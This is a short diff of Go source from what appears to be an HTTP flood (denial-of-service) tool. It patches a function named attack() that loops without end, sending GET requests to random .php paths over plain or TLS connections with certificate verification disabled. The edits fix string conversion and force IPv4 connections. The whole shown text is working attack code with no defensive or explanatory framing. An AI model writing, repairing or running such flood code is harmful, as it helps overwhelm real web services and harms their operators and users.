@@ -101,7 +101,7 @@ func attack() {
 	for {
 		header := getheader()
 		if rpath == true {
-			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
+			path = "/" + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + ".php"
 		}
 		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 		request := get_host + header
@@ -110,9 +110,9 @@ func attack() {
 				InsecureSkipVerify: true,
 				ServerName:         ip, //simple fix
 			}
-			s, err = tls.Dial("tcp", addr, cfg)
+			s, err = tls.Dial("tcp4", addr, cfg)
 		} else {
-			s, err = net.Dial("tcp", addr)
+			s, err = net.Dial("tcp4", addr)
 		}
 		if err != nil {
 			fmt.Println("Connection Down!!!")
